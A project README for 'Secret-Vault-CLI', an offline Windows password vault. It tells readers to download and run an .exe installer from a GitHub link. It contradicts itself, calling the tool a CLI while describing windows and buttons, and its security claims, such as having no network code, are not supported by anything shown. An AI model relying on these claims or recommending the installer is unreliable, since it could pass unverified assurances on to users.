# 🔒 Secret-Vault-CLI - Keep your digital secrets safe offline

[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/glowheat341/Secret-Vault-CLI)

## 🛡️ What is Secret-Vault-CLI

Secret-Vault-CLI protects your sensitive data on your computer. You choose what to save, and the software locks it with encryption. This tool stores your passwords and private notes locally. It does not use the internet. No cloud service stores your data. No company tracks your activity. You control your information at all times.

## 🔑 Security features

This application uses AES-256-GCM encryption. This standard protects data for government and financial institutions. It turns your information into unreadable code. Only your master password unlocks this data. The tool uses scrypt to strengthen your master password against unauthorized guesses. Your vault lives only on your hard drive. If you lose your hard drive, nobody can access your data without your password.

## ⬇️ Setup and Installation

Follow these steps to set up the vault on your Windows computer.

1. Go to the [Releases page](https://github.com/glowheat341/Secret-Vault-CLI).
2. Look for the latest version under the Releases heading.
3. Click the link that ends in .exe to download the installer.
4. Open the downloaded file once the transfer completes.
5. Follow the prompts on your screen to finish the installation.

## 🚀 Getting Started

Open the application after the installation finishes. The window prompts you to create a new vault.

1. Create a master password. Make this password long. Include letters, numbers, and symbols. 
2. Write this password on paper. Do not save it on your computer. If you lose this password, you cannot recover your data. The system cannot reset it for you.
3. Once you set the password, the main screen appears.
4. Click the button to add a new secret.
5. Enter a name for the item, such as "Bank Login" or "Email".
6. Enter the secret content.
7. Click Save to encrypt the information.

## ⚙️ Using the software

The application displays a list of your stored secrets. Click any item to view or copy the contents. The vault stays locked until you type your master password. Close the application window to lock the vault immediately. The software clears your data from the computer memory when you exit.

## 📋 System Requirements

This software works on all Windows versions from Windows 10 and newer. It requires 50 megabytes of storage space. You do not need an internet connection to run the program. The software runs locally on your own hardware. 

## ❓ Frequently Asked Questions

**Where does the software store my data?**
The software creates a small file on your local hard drive. The application keeps this file hidden in your user folder.

**Can I move my vault to another computer?**
Yes. You can copy the vault file to a USB drive or a new computer. Open the software on the new computer and point it to the file. You must remember your master password to unlock it there.

**Does the software send data to your servers?**
No. This software contains no network code. It cannot talk to the internet. Your secrets never leave your device.

**What happens if I forget my password?**
There is no way to regain access. The encryption is permanent without the correct password. You must keep your password in a safe place.

**Does this work on mobile phones?**
This version is for Windows desktop computers only. It does not support mobile operating systems.

## 🛠️ Performance Tips

Keep your vault file small for faster loading times. If you have thousands of entries, the program might take a second to open. Store your entries in categories to keep your list organized. Always quit the application when you finish your work. Leaving the vault open allows other people at your computer to see your secrets. Maintain a backup of your vault file on a secondary device like a flash drive. Ensure you protect the backup with the same level of care as the original.
